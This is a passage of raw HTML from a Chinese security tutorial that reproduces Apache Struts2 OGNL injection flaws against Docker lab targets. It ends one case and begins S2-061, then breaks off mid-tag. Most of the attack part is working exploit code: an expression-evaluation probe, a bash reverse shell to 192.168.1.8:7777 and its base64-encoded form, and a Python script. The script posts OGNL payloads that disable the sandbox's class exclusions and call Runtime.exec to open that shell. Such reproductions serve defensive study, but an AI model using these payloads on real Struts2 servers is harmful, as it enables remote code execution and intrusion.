-apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">访问8080看到有一个input:id</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4178217821782178" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/65_c1s3tQbJH7Nia4Epk7xoafPBWuejfw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w4M4slzODrtNeib9ib4zvkSbgL6Hic1s3tQbJH7Nia4Epk7xoafPBWuejfw/640?wx_fmt=png'" data-type="png" data-w="505" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">传参id=2进入发现出现在了input id:这个地方</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.4436229205175601" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/66_VOIsTwfGSkJgD4Iiawmo3eDE3DDOZQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5w6zrm4OHX6pA6GNI7NZbIBrdicXVOIsTwfGSkJgD4Iiawmo3eDE3DDOZQ/640?wx_fmt=png'" data-type="png" data-w="541" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里构造<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">id=%25{10*10}</code>，发现自动进行了运算</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.9375" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/67_HQozckkryIphNyeMiaq0jrbOCOS42A.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wbDm1X9bn2xcqYYd5W7hNiafAboHQozckkryIphNyeMiaq0jrbOCOS42A/640?wx_fmt=png'" data-type="png" data-w="656" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">使用bash反弹，先进行编码</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bash </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">i </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">dev</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">tcp</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">192.168</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1.8</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">/</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">7777</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">0</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;&amp;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">1</span></span></code></pre></section><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.37780149413020275" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/68_5bXrG1bwyF8OKiaXe2tyOMt4LRpW6Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wslVrK3vHEYo8k8Uvn9PYiaWmTG5bXrG1bwyF8OKiaXe2tyOMt4LRpW6Q/640?wx_fmt=png'" data-type="png" data-w="937" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">编码后结果如下</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bash </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">c </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">echo</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">YmFzaCAtaSA</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">+</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">JjE</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=}|{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">base64</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">d</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}|{</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">bash</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,-</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">i</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">生成一个test.py，将bash编码放入py</p><section class="code-snippet__github" style="margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;;height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;PingFang SC&quot;;text-align: start;white-space: normal;"><pre data-lang="python" style="-webkit-tap-highlight-color: transparent;display: grid;counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace;"><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">import</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> requests</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">url </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"http://127.0.0.1:8080"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data1 </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"id"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data2 </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"id"</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">:</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuOC83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}'))}"</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">res1 </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> requests</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">post</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">url</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> data</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data1</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"></code><code style="-webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex;padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important;"><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">res2 </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> requests</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">post</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">url</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">,</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> data</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">data2</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">执行即可得到反弹shell</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.5111969111969112" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/69_hPuSjbibEzhb59yibNA19ASfLlovbw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wdOzEeuEyiakLt5l8AWxxJG4L15FhPuSjbibEzhb59yibNA19ASfLlovbw/640?wx_fmt=png'" data-type="png" data-w="1295" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><h1 style="margin: 2em auto 1em;-webkit-tap-highlight-color: transparent;white-space: normal;text-align: center;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 1.2em;font-weight: bold;display: table;padding-right: 1em;padding-left: 1em;border-bottom: 2px solid rgb(15, 76, 129);">S2-061</h1><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">s2-061漏洞产生的原因是Struts2 会对某些标签属性(比如&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">id</code>，其他属性有待寻找) 的属性值进行二次表达式解析，因此当这些标签属性中使用了&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%{x}</code>&nbsp;且&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">x</code>&nbsp;的值用户可控时，用户再传入一个&nbsp;<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size: 12.6px;background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;">%{payload}</code>&nbsp;即可造成OGNL表达式执行。S2-061是对S2-059沙盒进行的绕过</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">进入s2-061的docker环境</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.48882931188561213" src="图片/HACK学习呀_2021-08-24_干货｜最全的Struts2漏洞复现/70_c9Id47mkT78CQLwaeaku0HOXE481QA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibBy0lhdbKX8MItu6icWjf5wticSicReRW2iadCusEmpGCw5Nic4ic9Id47mkT78CQLwaeaku0HOXE481QA/640?wx_fmt=png'" data-type="png" data-w="1119" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;border-radius: 4px;display: block;" title="null"  /></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">还是构造一个<code style="white-space:pre-wrap;-webkit-tap-highlight-color: transparent;color: rgb(221, 17, 68);line-height: 